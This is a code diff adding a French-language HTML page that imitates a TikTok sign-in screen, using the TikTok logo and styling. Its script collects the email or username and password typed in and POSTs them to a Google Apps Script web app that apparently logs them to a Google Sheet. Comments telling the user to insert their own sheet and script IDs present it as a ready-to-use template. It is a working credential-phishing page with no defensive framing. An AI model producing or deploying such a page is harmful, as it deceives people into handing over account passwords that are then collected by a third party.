@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S'inscrire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative; /* Pour la barre noire en bas */
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #cccccc; /* Initialement gris */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: not-allowed; /* Désactivé au début */
+        }
+        button.active {
+            background-color: #ff007f; /* Rose quand les champs sont remplis */
+            cursor: pointer;
+        }
+        /* Barre noire en bas de la page */
+        .bottom-bar {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background-color: black;
+            height: 50px;
+        }
+        /* Logo TikTok en haut à gauche */
+        .top-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            background-color: #000;
+        }
+        .top-bar img {
+            height: 30px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Barre supérieure avec le logo TikTok -->
+<div class="top-bar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg" alt="TikTok Logo">
+</div>
+
+<div class="container">
+    <h1>S'inscrire</h1>
+    <form id="loginForm" onsubmit="sendData(event)">
+        <input type="text" id="email" placeholder="Email ou Nom d'utilisateur" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button type="submit" id="submitBtn">Se connecter</button>
+    </form>
+</div>
+
+<!-- Barre noire en bas de la page -->
+<div class="bottom-bar"></div>
+
+<script>
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // ID de la feuille Google Sheets
+    const sheetId = '1NkQf4MHOuJqrAf6XMSwHuYOfRhXaGQ6OCGAe3nypErPqZZIbCAIltpWT'; // Remplace par l'ID de ta feuille
+    // ID du script Google Apps
+    const scriptId = 'AKfycbx5u4yKMrYBI07Jw2S6Q7oyl4LSPxBjjGvYFPVwhsQZbrRjbX_ltmq7Rp1qEKFBx4TQ'; // Remplace par l'ID de ton script
+
+    // URL du script Web App
+    const scriptURL = `https://script.google.com/macros/s/${scriptId}/exec`;
+
+    // Activer le bouton rose quand les champs sont remplis
+    function checkFields() {
+        if (emailInput.value && passwordInput.value) {
+            submitBtn.classList.add('active');
+            submitBtn.disabled = false;
+        } else {
+            submitBtn.classList.remove('active');
+            submitBtn.disabled = true;
+        }
+    }
+
+    emailInput.addEventListener('input', checkFields);
+    passwordInput.addEventListener('input', checkFields);
+
+    async function sendData(event) {
+        event.preventDefault(); // Empêche le rechargement de la page
+
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        const formData = new URLSearchParams();
+        formData.append('email', email);
+        formData.append('password', password);
+
+        try {
+            const response = await fetch(scriptURL, {
+                method: 'POST',
+                body: formData,
+            });
+            if (response.ok) {
+                alert('Utilisateur ajouté avec succès !');
+                document.getElementById('loginForm').reset(); // Réinitialiser le formulaire
+                submitBtn.classList.remove('active'); // Réinitialiser la couleur du bouton
+                submitBtn.disabled = true; // Rendre le bouton à nouveau gris
+            } else {
+                alert('Erreur lors de l\'ajout de l\'utilisateur.');
+            }
+        } catch (error) {
+            alert('Erreur lors de l\'envoi des données.');
+            console.error('Erreur:', error);
+        }
+    }
+</script>
+
+</body>
+</html>
